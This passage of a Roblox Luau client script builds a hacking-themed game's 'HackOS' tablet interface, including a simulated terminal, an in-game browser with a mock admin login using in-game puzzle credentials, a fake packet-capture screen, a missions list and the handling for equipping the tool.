	mk("UIListLayout", {
		Parent = PacketListFrame,
		Name = "UIListLayout",
		Padding = UDim.new(0, 6),
		SortOrder = Enum.SortOrder.LayoutOrder,
	})

	goBtn.MouseButton1Click:Connect(function()
		navigateTo(UrlBox.Text)
	end)

	local function tryAdminLogin()
		local u = tostring((AdminUserBox.Text or "")):lower()
		local p = tostring(AdminPassBox:GetAttribute("RealPassword") or "")

		if u == "bloxplay-admin" and p == "blox123" then
			browserState.adminLoggedIn = true
			Player:SetAttribute("Obj_Admin", true)
			AdminLoginStatus.Text = "Login successful (sim)"
			AdminPassBox.Text = ""
			AdminPassBox:SetAttribute("RealPassword", "")
			navigateTo("bloxplay.com/admin")
		else
			AdminLoginStatus.Text = "Access denied (sim)"
			AdminPassBox.Text = ""
			AdminPassBox:SetAttribute("RealPassword", "")
		end
	end

	adminLoginBtn.MouseButton1Click:Connect(tryAdminLogin)

	AdminSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
		renderAdminResults(AdminSearchBox.Text)
	end)

	PacketApplyBtn.MouseButton1Click:Connect(function()
		local ip = PacketIPBox.Text
		if startPacketCaptureForIP(ip) then
			populatePacketRows()
			local host = getHostByIP(ip)
			setBrowserStatus(("Capturing packets for %s [%s] (sim)"):format(host.label, host.ip))
		else
			populatePacketRows()
			setBrowserStatus("Unknown IP. No simulated capture available.")
		end
	end)

	PacketClearBtn.MouseButton1Click:Connect(function()
		if PacketIPBox then PacketIPBox.Text = "" end
		if PacketDNSBox then PacketDNSBox.Text = "" end
		ActivePacketCapture.targetIP = ""
		ActivePacketCapture.targetLabel = ""
		ActivePacketCapture.rows = {}
		populatePacketRows()
		setBrowserStatus("RBXPacketNet filters cleared (sim)")
	end)

	PacketFollowBtn.MouseButton1Click:Connect(function()
		if PacketIPBox.Text == "" then
			PacketIPBox.Text = "192.168.32.12"
		end
		startPacketCaptureForIP(PacketIPBox.Text)
		if PacketDNSBox.Text == "" then
			PacketDNSBox.Text = "playerdata"
		end
		populatePacketRows()
		setBrowserStatus("Following simulated traffic stream.")
	end)

	UIS.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end
		if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

		if input.KeyCode == Enum.KeyCode.Up then
			local focused = nil
			pcall(function() focused = UIS:GetFocusedTextBox() end)
			if focused == TermInput then
				historyUp()
			end
			return
		elseif input.KeyCode == Enum.KeyCode.Down then
			local focused = nil
			pcall(function() focused = UIS:GetFocusedTextBox() end)
			if focused == TermInput then
				historyDown()
			end
			return
		end

		if input.KeyCode ~= Enum.KeyCode.Return and input.KeyCode ~= Enum.KeyCode.KeypadEnter then
			return
		end

		local focused = nil
		pcall(function() focused = UIS:GetFocusedTextBox() end)

		if focused == UrlBox then
			navigateTo(UrlBox.Text)
		elseif focused == AdminPassBox or focused == AdminUserBox then
			if AdminLoginPage and AdminLoginPage.Visible then
				tryAdminLogin()
			end
		elseif focused == PacketIPBox or focused == PacketDNSBox then
			if PacketPage and PacketPage.Visible then
				if PacketIPBox.Text ~= "" then
					startPacketCaptureForIP(PacketIPBox.Text)
				end
				populatePacketRows()
			end
		end
	end)

	UrlBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			navigateTo(UrlBox.Text)
		end
	end)

	local function canRefocusTerminal()
		if not (MainGUI and MainGUI.Enabled) then return false end
		if not (TermFrame and TermFrame.Visible) then return false end
		if not (TermInput and TermInput.Parent) then return false end
		if not (isToolEquipped() and started) then return false end
		local focused = nil
		pcall(function() focused = UIS:GetFocusedTextBox() end)
		return focused == nil or focused == TermInput
	end

	TermInput:GetPropertyChangedSignal("Text"):Connect(function()
		if historyIndex == nil then
			currentDraft = TermInput.Text
		end
	end)

	TermInput.FocusLost:Connect(function(enter)
		if enter then
			local c = TermInput.Text
			TermInput.Text = ""
			pushHistory(c)
			handle(c)
		end
		task.defer(function()
			if canRefocusTerminal() then
				TermInput:CaptureFocus()
			end
		end)
	end)

	bTerm.MouseButton1Click:Connect(function()
		TermFrame.Visible = true
		BrowserFrame.Visible = false
		MissionsFrame.Visible = false
		TermInput:CaptureFocus()
	end)

	bBrowser.MouseButton1Click:Connect(function()
		TermFrame.Visible = false
		BrowserFrame.Visible = true
		MissionsFrame.Visible = false
		if UrlBox and UrlBox.Text == "" then
			UrlBox.Text = "home"
			navigateTo("home")
		else
			navigateTo(UrlBox.Text)
		end
		pcall(function() UrlBox:CaptureFocus() end)
	end)

	bMissions.MouseButton1Click:Connect(function()
		TermFrame.Visible = false
		BrowserFrame.Visible = false
		MissionsFrame.Visible = true
	end)

	bSave.MouseButton1Click:Connect(saveNow)
	bLoad.MouseButton1Click:Connect(loadNow)
	bClose.MouseButton1Click:Connect(function()
		gui.Enabled = false
		started = false
		stopAudio()
		teardownStart()
	end)

	addLine(PROMPT)
	return gui
end

local function playStart(onDone)
	local blur = mk("BlurEffect", { Parent = Lighting, Name = BLUR_NAME, Size = 12 })
	local gui = mk("ScreenGui", { Parent = PlayerGui, Name = "HackStart", IgnoreGuiInset = true, ResetOnSpawn = false })
	local bg = mk("Frame", { Parent = gui, Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.fromRGB(8, 10, 14) })
	local card = mk("Frame", {
		Parent = bg,
		Size = UDim2.fromOffset(420, 180),
		Position = UDim2.fromScale(0.5, 0.5),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundColor3 = Color3.fromRGB(16, 22, 35),
	})
	round(card, 16)
	mk("UIStroke", {
		Parent = card,
		Color = Color3.fromRGB(80, 123, 255),
		Thickness = 1,
		Transparency = 0.2,
	})
	mk("TextLabel", {
		Parent = card,
		BackgroundTransparency = 1,
		Text = "Booting HackOS",
		Font = Enum.Font.GothamBold,
		TextSize = 28,
		TextColor3 = Color3.fromRGB(220, 235, 255),
		Size = UDim2.new(1, 0, 0, 44),
		Position = UDim2.new(0, 0, 0, 18),
	})

	local bar = mk("Frame", {
		Parent = card,
		BackgroundColor3 = Color3.fromRGB(30, 40, 62),
		Size = UDim2.new(1, -40, 0, 12),
		Position = UDim2.new(0, 20, 1, -42),
	})
	round(bar, 8)

	local fill = mk("Frame", {
		Parent = bar,
		BackgroundColor3 = Color3.fromRGB(86, 140, 255),
		Size = UDim2.new(0, 0, 1, 0),
	})
	round(fill, 8)

	local t = Tween:Create(fill, TweenInfo.new(1.0, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
		Size = UDim2.new(1, 0, 1, 0),
	})
	t:Play()

	t.Completed:Connect(function()
		gui:Destroy()
		Tween:Create(blur, TweenInfo.new(0.2), { Size = 0 }):Play()
		task.delay(0.22, function()
			if blur then blur:Destroy() end
		end)
		if onDone then onDone() end
	end)
end

local function buildHint()
	local gui = mk("ScreenGui", {
		Parent = PlayerGui,
		Name = "TabletHint",
		IgnoreGuiInset = true,
		ResetOnSpawn = false,
		Enabled = false,
	})

	local shade = mk("Frame", {
		Parent = gui,
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = Color3.fromRGB(5, 8, 12),
		BackgroundTransparency = 0.3,
	})

	local panel = mk("Frame", {
		Parent = shade,
		BackgroundColor3 = Color3.fromRGB(15, 20, 32),
		Size = UDim2.fromOffset(430, 190),
		Position = UDim2.fromScale(0.5, 0.62),
		AnchorPoint = Vector2.new(0.5, 0.5),
	})
	round(panel, 16)

	mk("TextLabel", {
		Parent = panel,
		BackgroundTransparency = 1,
		Font = Enum.Font.GothamBlack,
		TextSize = 28,
		TextColor3 = Color3.fromRGB(225, 235, 255),
		Text = "HackOS Tablet",
		Size = UDim2.new(1, 0, 0, 36),
		Position = UDim2.new(0, 0, 0, 16),
	})

	mk("TextLabel", {
		Parent = panel,
		BackgroundTransparency = 1,
		Font = Enum.Font.Gotham,
		TextSize = 16,
		TextColor3 = Color3.fromRGB(180, 200, 230),
		TextWrapped = true,
		Text = UIS.TouchEnabled and "Tap START to boot." or "Click START to boot.",
		Size = UDim2.new(1, -40, 0, 42),
		Position = UDim2.new(0, 20, 0, 60),
	})

	local startBtn = mk("TextButton", {
		Parent = panel,
		Text = "START",
		Font = Enum.Font.GothamSemibold,
		TextSize = 18,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(79, 131, 255),
		Size = UDim2.fromOffset(210, 42),
		Position = UDim2.new(0.5, -105, 1, -58),
	})
	round(startBtn, 12)

	startBtn.MouseButton1Click:Connect(function()
		if not isToolEquipped() then
			gui.Enabled = false
			return
		end
		gui.Enabled = false
		playStart(function()
			if isToolEquipped() and MainGUI then
				MainGUI.Enabled = true
				started = true
				playAudio()
				if TermInput then TermInput:CaptureFocus() end
			else
				stopAudio()
			end
		end)
	end)

	return gui
end

local function allowE()
	return isToolEquipped() and started and MainGUI and MainGUI.Enabled
end

local function bindEGuard()
	CAS:UnbindAction(E_BIND)
	CAS:BindActionAtPriority(E_BIND, function(_, state)
		if state ~= Enum.UserInputState.Begin then
			return Enum.ContextActionResult.Pass
		end
		return allowE() and Enum.ContextActionResult.Pass or Enum.ContextActionResult.Sink
	end, false, Enum.ContextActionPriority.High.Value, Enum.KeyCode.E)
end

ObjectiveManager.Changed:Connect(function(objectivesList)
	if not MissionsList then return end

	for _, child in ipairs(MissionsList:GetChildren()) do
		if child:IsA("Frame") then
			child:Destroy()
		end
	end

	for _, taskInfo in ipairs(objectivesList) do
		local taskRow = mk("Frame", {
			Parent = MissionsList,
			BackgroundColor3 = Color3.fromRGB(20, 26, 38),
			Size = UDim2.new(1, -10, 0, 50),
		})
		round(taskRow, 8)

		mk("TextLabel", {
			Parent = taskRow,
			BackgroundTransparency = 1,
			Text = taskInfo.text,
			Font = Enum.Font.GothamSemibold,
			TextSize = 14,
			TextColor3 = Color3.new(1, 1, 1),
			Position = UDim2.new(0, 10, 0, 5),
			Size = UDim2.new(1, -20, 0, 20),
			TextXAlignment = Enum.TextXAlignment.Left,
		})

		local statusColor = Color3.fromRGB(150, 150, 150)
		if taskInfo.status == "Completed" then
			statusColor = Color3.fromRGB(0, 255, 100)
		elseif taskInfo.status == "In Progress" then
			statusColor = Color3.fromRGB(255, 200, 0)
		end

		mk("TextLabel", {
			Parent = taskRow,
			BackgroundTransparency = 1,
			Text = string.upper(taskInfo.status),
			Font = Enum.Font.GothamBold,
			TextSize = 12,
			TextColor3 = statusColor,
			Position = UDim2.new(0, 10, 0, 25),
			Size = UDim2.new(1, -20, 0, 20),
			TextXAlignment = Enum.TextXAlignment.Left,
		})
	end
end)

MainGUI = buildMainUI()
HintGUI = buildHint()
bindEGuard()

task.spawn(function()
	while MainGUI and MainGUI.Parent do
		if ClockLabel then
			ClockLabel.Text = os.date("%H:%M:%S")
		end
		task.wait(1)
	end
end)

local function onEquipped()
	setEquipped(true)
	if HintGUI and not started then
		HintGUI.Enabled = true
	end
	bindEGuard()
end

local function onUnequipped()
	setEquipped(false)
	started = false
	if HintGUI then HintGUI.Enabled = false end
	if MainGUI then MainGUI.Enabled = false end
	stopAudio()
	teardownStart()
	bindEGuard()
end

local function hookTool(t)
	if Tool == t then return end
	Tool = t

	t.AncestryChanged:Connect(function(_, parent)
		if not parent and Tool == t then
			onUnequipped()
			Tool = nil
		end
	end)

	t.Equipped:Connect(onEquipped)
	t.Unequipped:Connect(onUnequipped)

	local char = Player.Character
	if char and t.Parent == char then
		onEquipped()
	end
end

local function findTool()
	local char = Player.Character
	local backpack = Player:FindFirstChildOfClass("Backpack")

	if char then
		local t = char:FindFirstChild(TOOL_NAME)
		if t and t:IsA("Tool") then return t end
	end
	if backpack then
		local t = backpack:FindFirstChild(TOOL_NAME)
		if t and t:IsA("Tool") then return t end
	end
	return nil
end

local function scanForToolNow()
	local t = findTool()
	if t then hookTool(t) end
end

local function watch(container)
	if not container then return end
	container.ChildAdded:Connect(function(child)
		if child:IsA("Tool") and child.Name == TOOL_NAME then
			hookTool(child)
		end
	end)
	local existing = container:FindFirstChild(TOOL_NAME)
	if existing and existing:IsA("Tool") then
		hookTool(existing)
	end
end

watch(Player:WaitForChild("Backpack"))
watch(Player.Character or Player.CharacterAdded:Wait())
scanForToolNow()

Player.CharacterAdded:Connect(function(char)
	started = false
	stopAudio()
	teardownStart()
	bindEGuard()
	watch(char)
	task.defer(scanForToolNow)
end)

local lastEquipped = false
RunService.Heartbeat:Connect(function()
	if not Tool then
		scanForToolNow()
		return
	end

	local equippedNow = isToolEquipped()
	if equippedNow ~= lastEquipped then
		lastEquipped = equippedNow
		if equippedNow then
			onEquipped()
		else
			onUnequipped()
		end
	end
end)

if MainGUI then
	MainGUI:GetPropertyChangedSignal("Enabled"):Connect(bindEGuard)
end